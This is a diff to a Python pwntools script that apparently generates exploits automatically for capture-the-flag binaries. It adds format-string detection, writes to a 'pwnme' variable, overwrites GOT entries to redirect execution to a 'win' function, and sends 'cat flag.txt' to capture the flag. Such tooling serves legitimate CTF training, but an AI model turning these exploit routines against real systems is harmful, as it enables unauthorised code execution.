@@ -96,25 +96,48 @@ class Raeg:
         p.sendline(b"%p")
         output = b""
         try:
-            p.recvline(b"<<<")
+            p.recvuntil(b"<<<")
             output = p.recvline()
         except EOFError:
             output = b""
-
+        logger.info(output)
         if b"0x" in output or b"nil" in output:
             self.has_leak = True
             logger.info(f"Found a format string vulnerability with {output}")
 
-            self.format_leak()
             symbols = []
             if "pwnme" in self.elf.sym.keys():
-                logger.info("Found a format overwrite with the pwnme variable")
-                self.exploit_function = "pwnme"
+                logging.getLogger("pwnlib").setLevel(logging.INFO)
+                log.info("Found a format overwrite with the pwnme variable")
+                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                ret = self.format_write(1337, self.elf.sym['pwnme'])
+                if ret == 1:
+                    None
+                else:
+                    for i in self.elf.got.keys():
+                        try:
+                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                            if ret == 1:
+                                break
+                        except:
+                            log.info("Not the Correct Address...")
             elif "win" in self.elf.sym.keys() and "pwnme" not in self.elf.sym.keys():
-                logger.info("Found a win function with a format got overwrite")
+                logging.getLogger("pwnlib").setLevel(logging.INFO)
+                log.info("Found a win function with a format got overwrite")
+                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                for i in self.elf.got.keys():
+                    try:
+                        ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                        if ret == 1:
+                            break
+                    except:
+                        log.info("Not the Correct Address...")
                 self.exploit_function = "win"
             elif "fopen" in self.elf.sym.keys():
-                logger.info("Found a format read")
+                logging.getLogger("pwnlib").setLevel(logging.INFO)
+                log.info("Found a format read")
+                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                self.format_leak()
             else:
                 self.angry_stack_smash()
                 self.generate_rop_chain()
@@ -563,6 +586,7 @@ class Raeg:
         for  i in range(1, stack_len):
 
             if control == 1:
+                logging.info(self.flag)
                 break
 
             p = process(self.binary)
@@ -598,7 +622,6 @@ class Raeg:
                         elif start_end[0] == 1 and "}" in flag.decode():
                             string += flag.decode()
                             self.flag = string
-
                         elif start_end[0] == 1 and "}" not in flag.decode():
                             string += flag.decode()
                         elif "}" in flag.decode() and start_end[1] == 0:
@@ -671,7 +694,17 @@ class Raeg:
         p = process(self.binary)
         p.sendline(format_string)
         p.sendline(b'cat flag.txt')
-        p.interactive()
+        
+        #Tries to recv all until timeout
+        try:
+            data = p.recvall(timeout=8)
+            if 'flag' in data.decode():
+                print(data)
+                p.close()
+                return 1
+        except:
+            log.warning("Receive Failed...")
+            return 0 
 
 
 
@@ -793,6 +826,19 @@ if __name__ == "__main__":
     args = parser.parse_args()
     rage = Raeg(args.bin, "/opt/libc.so.6")
     #rage = Raeg(args.bin, "/usr/lib/libc.so.6")
+
+    ascii_art = """
+     ██▀███   ▄▄▄        ▄████ ▓█████ 
+    ▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀ 
+    ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███   
+    ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ 
+    ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
+    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
+      ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
+      ░░   ░   ░   ▒   ░ ░   ░    ░   
+       ░           ░  ░      ░    ░  ░
+                                      """
+    print(ascii_art)
     rage.find_vulnerability()
 
     rage.exploit()
